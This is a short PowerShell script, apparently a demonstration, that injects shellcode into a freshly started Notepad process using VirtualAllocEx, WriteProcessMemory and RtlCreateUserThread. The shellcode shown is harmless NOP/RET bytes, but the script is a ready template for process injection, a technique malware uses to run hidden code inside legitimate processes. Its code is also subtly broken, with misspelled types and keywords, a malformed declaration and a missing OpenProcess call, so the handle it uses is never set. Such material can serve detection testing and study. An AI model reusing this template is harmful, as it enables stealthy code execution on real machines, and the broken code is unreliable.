# Start Notepad Process, this will be our injection process

$NotepadProcess = Invoke-CimMethod -ClassName Win32_Proces -MethodName Create -Arguments @{ CommandLine = 'Notepad.exe' }

# Compile and load Windows APIFunctions that will be injected into another process

process
Add-Type -TypeDefinition @'
using System;
Using System.RunTime.InteropServices;

namespace Win32 {
    public class nativeMethods {
    [DLLImport("kernel32.dll", SetLastError = true)] public static extern
IntrPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);
    [Dllimport("kernel32.dll", SetLastError = true)] public static extern
IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int
flAllocationType, int flProtect);
    [Dllimport("kernel32.dll", SetLastError = true)] public static extern bool
WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint
nSize, ref uint lpNumberOfBytesWritten);
    [Dllimport("kernel32.dll", SetLastError = true)] public static extern bool
CloseHandle(IntPtr hObject);
    [DllImport("ntdll.dll")] public static extern int
RtlCreateUserThread(IntPtr ProcessHandle, IntPtr SecurityDesriptor, bool
CreateSuspended, IntPtr StackZeroBits, IntPtr StackReserved, IntPtr StackCommit,
IntPtr StartAddress, IntPtr StartParameter, ref IntPtr ThreadHandle, ref IntPtr
ClientID0;
        }
}
'@

#Benign shellcode to inject into notepad - 0x90(NOP), 0x90(NOP), 0x90(NOP), 0xC3(RET)
[Byte[]] $Code = @(0x90, 0x90, 0x90,0xC3)

# Obtain a handle to open notepad process
$TargetProcessBaseAddress = 
[Win32.NativeMethods]::VirtualAllocEx($TargetProcessHandle, [IntPtr]::Zero,
$Code.Length, 0x300, 0x40)

# Write the shellcode buffer to the notepad process
$BytesWritten = 0
$null = [Win32.NativeMethods]::WriteProcessMemory($TargetProcessHandle,
$TargetProcessBaseAddress, $Code, $Code.Length, [Ref] $BytesWritten)

# Excute the shellcode in the notepad process

[IntPtr] $RemoteThreadHandle = [IntPtr]::Zero
[IntPtr] $ClientId = [IntPtr]::Zero
$null = [Win32.NativeMethods]::RtlCreateUserThread($TargetProcessHandle,
[IntPtr]::Zero, $False, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
$TargetProcessBaseAddress, [IntPtr]::Zero, [Ref] $RemoteThreadHandle, [Ref] $ClientId)

# Cleanup

$null = [Win32.NativeMethods]::Closehandle($RemoteThreadHandle)
$null = [Win32.NativeMethods]::CloseHandle($TargetProcessHandle)
Stop-Process -Id $NotepadProcess.ProcessId